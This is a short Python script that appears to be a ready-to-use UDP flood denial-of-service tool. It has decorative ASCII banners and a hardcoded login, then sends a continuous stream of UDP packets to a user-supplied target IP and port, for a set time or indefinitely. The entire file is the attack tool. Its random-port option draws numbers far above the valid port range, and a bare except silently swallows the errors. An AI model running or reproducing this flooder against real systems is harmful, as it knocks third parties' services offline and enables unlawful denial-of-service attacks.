#!/usr/bin/python
import socket
import random
import sys
import time
import os

def clear_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_user_input():
    target_ip = input('''
 __________________________
  /\                         \\
 /  \            ____         \\
/ \/ \          /\   \         \\
\ /\  \         \ \   \         \\
 \  \  \     ____\_\   \______   \\
  \   /\\   /\                \   \\
   \ /\/ \  \ \_______    _____\   \\
    \\/ / \  \/______/\   \____/    \\
     \ / /\\         \ \   \         \\
      \ /\/ \         \ \   \         \\
       \\/ / \         \ \   \         \\
         \ /\\         \ \   \         \\
          \ /\/ \         \ \   \         \\
           \\/ / \         \ \   \         \\
  May   \ /   \         \ \   \         \\
         \\  /\\         \ \   \         \\
God Bless \ /\  \         \ \___\         \\
           \\    \         \/___/          \\
  you in    \  \/ \                         \\
             \ /\  \_________________________\\
              \\    \______________________  /
               \  \/ ______________________  /
                \/_________________________/ 
               
Enter the target IP address: 
''')
    return target_ip

def authenticate(username, password):
    valid_username = "kordvaultpass"
    valid_password = "kordvaultpass"
    return username == valid_username and password == valid_password

def UDPFlood():
    clear_terminal()
    print('''             ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;
       ,:::::'       ;
       ::::::;       ;
       ;:::::;       ;
      ,;::::::;     ;
    ;:::::::::`. ,,,;.
  .';:::::::::::::::::;,
 ,::::::;::::::;;;;::::;,
;`::::::`'::::::;;;::::: ,#
:`:::::::`;::::::;;::: ;::#
::`:::::::`;:::::::: ;::::#
`:`:::::::`;:::::: ;::::::#/
 :::`:::::::`;; ;:::::::::#/
 ::::`:::::::`;::::::::;:::#/
 `:::::`::::::::::::;'`:;::#/
  `:::::`::::::::;' /  / `:#/
   ::::::`:::::;'  /  /   `#/
    `:::::;::::;'  /  /     #
     `:::::;::/  /     #
       `:::::/  /      #
         `:::; /       #
           `:/        #
''')

    print("==== UDP Flood Attack ====")
    print("Please provide the following information:")

    username = input("Username: ")
    password = input("Password: ")

    if not authenticate(username, password):
        print("Invalid credentials. Access denied.")
        return

    clear_terminal()

    print("==== UDP Flood Attack ====")
    print("Logged in successfully.\n")

    target_ip = get_user_input()

    if not target_ip:
        print("Invalid input. Please provide the required information.")
        return

    target_port = input("Enter the target port (0=random): ")
    dur = input("Enter the duration in seconds (0=forever): ")

    if not target_port or not dur:
        print("Invalid input. Please provide all the required information.")
        return

    target_port = int(target_port)
    randport = (True, False)[target_port == 0]
    dur = int(dur)
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    print(f'\nStarting UDP Flood: {target_ip}:{target_port} for {dur or "infinite"} seconds')

    # Create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        target_port = (random.randint(1, 15000000), target_port)[randport]
        if clock() < duration:
            try:
                # Create a UDP packet
                packet = b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                # Send the packet to the server
                sock.sendto(packet, (target_ip, target_port))
            except:
                pass
        else:
            break

    print('UDP Flood DONE')

if __name__ == '__main__':
    UDPFlood()